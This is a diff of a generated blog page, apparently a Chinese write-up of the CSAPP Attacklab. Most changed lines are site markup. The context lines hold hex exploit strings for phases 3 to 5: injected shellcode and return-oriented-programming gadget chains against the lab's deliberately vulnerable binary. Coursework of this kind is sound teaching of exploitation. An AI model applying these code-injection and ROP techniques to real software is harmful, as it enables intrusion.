@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.1.1">
+<meta name="generator" content="Hexo 4.2.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -21,7 +21,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"www.ravenxrz.ink","root":"/","scheme":"Mist","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"www.ravenxrz.ink","root":"/","scheme":"Mist","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="csapp lab系列：  Csapp-Datalab 详解 Csapp-Bomblab 题解  本次lab: Attacklab 耽误了整整一个月没有做csapp的lab了. 忙着返校,忙着实验室的东西, 今天抽了点时间,总算是完成了第三个实验. 下面就记录下题解分析吧.">
@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721100554201.png">
 <meta property="article:published_time" content="2020-07-21T06:14:03.000Z">
-<meta property="article:modified_time" content="2020-09-06T02:45:08.026Z">
+<meta property="article:modified_time" content="2020-09-06T07:37:36.748Z">
 <meta property="article:author" content="Raven">
 <meta property="article:tag" content="Attacklab">
 <meta name="twitter:card" content="summary">
@@ -92,6 +92,7 @@
   </style>
 </noscript>
 
+<link rel="alternate" href="/atom.xml" title="Raven's Blog" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -242,7 +243,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-06 10:45:08" itemprop="dateModified" datetime="2020-09-06T10:45:08+08:00">2020-09-06</time>
+                <time title="修改时间：2020-09-06 15:37:36" itemprop="dateModified" datetime="2020-09-06T15:37:36+08:00">2020-09-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -309,7 +310,7 @@
 <p>也就是说, getbuf首先开辟了0x28的stack空间.</p>
 <p>对于touch1来说,我们知道它的地址是:0x4017c0. </p>
 <p>好的,知道这两点,我们就可以写攻击代码了, 在写之前, 先画个示意图:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720231159598.png" alt="image-20200720231159598"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720231159598.png" alt="image-20200720231159598"></p>
 <p>说明:</p>
 <ol>
 <li>单元格中存放的是起始起始,一个内存单元8个字节</li>
@@ -340,7 +341,7 @@
 <li>跳转到touch2即可.</li>
 </ol>
 <p>但是这里存在两个跳转, 1.跳转我们的注入代码的首地址.2.跳转到touch2. 画个图看看:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720232843852.png" alt="image-20200720232843852"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720232843852.png" alt="image-20200720232843852"></p>
 <p>也就是说,我们首先应该跳转到我们注入的代码的首地址, 然后注入代码执行过程中(红色的区域的某个部分),又跳转到touch2. </p>
 <p>跳转1很直观, 我们覆盖了原来的地址, 那跳转2如何实现?</p>
 <p>这个就要理解清除call和ret指令的工作了, 简单说来:</p>
@@ -387,9 +388,9 @@
 <li><p>我最初想的是, 将字符串存放在一个相对很低的位置, 让后续的两个函数不会产生覆盖. 但是这样的问题是, cooike string无法进行硬编码. 毕竟没有指令可以直接写字符串到内存中, 倒是可以一个个字符的写入, 但是这样我们的exploit string会过长, 于是这个方法废弃了.</p>
 </li>
 <li><p>说第二想法之前, 我们先看看后续的程序会对stack空间做些什么:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090502836.png" alt="image-20200721090502836"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090502836.png" alt="image-20200721090502836"></p>
 <p>那字符串到底放在哪里? 我尝试了将字符串放在了buf的stack顶端和低端, 如下两图:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090628772.png" alt="image-20200721090628772"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090628772.png" alt="image-20200721090628772"></p>
 <p>经过gdb调试,两者都会被覆盖, 所以这个方案也被pass掉了.</p>
 <p>继续思考, 放在内存的低端的确很容易被覆盖,因为hexmatch函数中有个随机从某个位置开始写入cbuf的操作, 所以低端是没法用的. 只能考虑高端, 高端是由 push压入regs导致的覆盖, 只要避免了这个就好了. 回忆以下push指令是如何工作的, </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push reg</span><br></pre></td></tr></table></figure>
@@ -398,7 +399,7 @@
 <p>所以我们可以直接继续覆盖, 看示意图:</p>
 </li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p>
 <p>可以得到注入代码:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question3: *&#x2F;</span><br><span class="line">48 c7 c7 a8 dc 61 55 &#x2F;* mov $0x5561dca8,%rdi 设置$rdi指向string内存地址 *&#x2F;</span><br><span class="line">68 fa 18 40 00       &#x2F;* pushq  $0x4018fa     push touch3的地址 *&#x2F;</span><br><span class="line">c3                   &#x2F;* ret                  返回 *&#x2F;</span><br><span class="line">&#x2F;* 上面一共13个字节, buf一共40个字节所以需要填充 40-13&#x3D;27个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00                &#x2F;* 3 bytes *&#x2F;</span><br><span class="line">78 dc 61 55 00 00 00 00 &#x2F;* exploit string code 的开始地址（即get buf的栈地地址) *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* 继续覆盖为cookie string *&#x2F;</span><br></pre></td></tr></table></figure>
 
@@ -407,8 +408,8 @@
 <p>本题的背景是开启了 stack随机化和注入注入代码不可执行 两个功能的.</p>
 <p>好,现在来看看phase4题目:</p>
 <p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).<br>movq : The codes for these are shown in Figure 3A.<br>popq : The codes for these are shown in Figure 3B.<br>ret : This instruction is encoded by the single byte 0xc3.<br>nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single<br>byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093742135.png" alt="image-20200721093742135"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093753166.png" alt="image-20200721093753166"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093742135.png" alt="image-20200721093742135"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093753166.png" alt="image-20200721093753166"></p>
 <p>所有可用指令, 我都高亮了.</p>
 <p>注意点:</p>
 <p>题目中提到的gadget farm是指在rtaget反汇编后, 我们的gaddget只能从start_farm段到end_farm段之间的所有指令中抽取. 这之间的指令为:</p>
@@ -426,7 +427,7 @@
 
 <p>显然,用pop的概率更大.</p>
 <p>pop是将$rsp当前指向的数据  pop 到 $rax 上, 所以我们可得gaddget如下图:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093518556.png" alt="image-20200721093518556"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093518556.png" alt="image-20200721093518556"></p>
 <p>知道这些, 我们只用到 rtaget的gaddgets_farm中找到对应的指令字节码即可, 最终可得:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 先填充40个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">&#x2F;* 写入gadgets *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00 &#x2F;* pop $rax *&#x2F;</span><br><span class="line">fa 97 b9 59 00 00 00 00 &#x2F;* cookie *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">ec 17 40 00 00 00 00 00 &#x2F;* touch2 地址 *&#x2F;</span><br></pre></td></tr></table></figure>
 
@@ -445,7 +446,7 @@
 <li>touch3跳转</li>
 </ol>
 <p>回忆以下我们在phase3中是怎么做的?看看下面的示意图.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p>
 <p>从这张图中, 我们可以考虑一下如果运用aop , string到底放在哪里合适? 我们的前提是任何时候都不能覆盖string.</p>
 <p><strong>显然 string 依然应该放内存中的最高位. 因为栈是往下push的.</strong> </p>
 <p>好, 那什么时候跳转到touch3? </p>
@@ -468,7 +469,7 @@
 <p>rax = rdi + rsi</p>
 <p>这样, 所有的条件都凑齐了.</p>
 <p>画个示意图:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721100554201.png" alt="image-20200721100554201"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721100554201.png" alt="image-20200721100554201"></p>
 <p>于是可以有攻击代码:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 前0x28个字符填充0x00 *&#x2F;</span><br><span class="line">06 1a 40 00 00 00 00 00 &#x2F;* mov $rsp,$rax *&#x2F;</span><br><span class="line">c5 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00 &#x2F;* pop $rax *&#x2F;</span><br><span class="line">48 00 00 00 00 00 00 00 &#x2F;* offset *&#x2F;</span><br><span class="line">dd 19 40 00 00 00 00 00 &#x2F;* movl $eax,$edx *&#x2F;</span><br><span class="line">34 1a 40 00 00 00 00 00 &#x2F;* movl $edx,$ecx *&#x2F;</span><br><span class="line">63 1a 40 00 00 00 00 00 &#x2F;* movl $ecx,$esi *&#x2F;</span><br><span class="line">d6 19 40 00 00 00 00 00 &#x2F;* lea (%rdi,%rsi,1),%rax *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">fa 18 40 00 00 00 00 00 &#x2F;* touch3 地址 *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* cookie value *&#x2F;</span><br></pre></td></tr></table></figure>
 
@@ -599,7 +600,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-text">0. 背景知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Phase-1"><span class="nav-text">1. Phase 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Phase-2"><span class="nav-text">2. Phase 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Phase-3"><span class="nav-text">3. Phase 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Phase-4"><span class="nav-text">4. Phase 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Phase-5"><span class="nav-text">5. Phase 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E5%B0%BE%E8%AF%AD"><span class="nav-text">6. 尾语</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-背景知识"><span class="nav-text">0. 背景知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Phase-1"><span class="nav-text">1. Phase 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Phase-2"><span class="nav-text">2. Phase 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Phase-3"><span class="nav-text">3. Phase 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Phase-4"><span class="nav-text">4. Phase 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Phase-5"><span class="nav-text">5. Phase 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-尾语"><span class="nav-text">6. 尾语</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
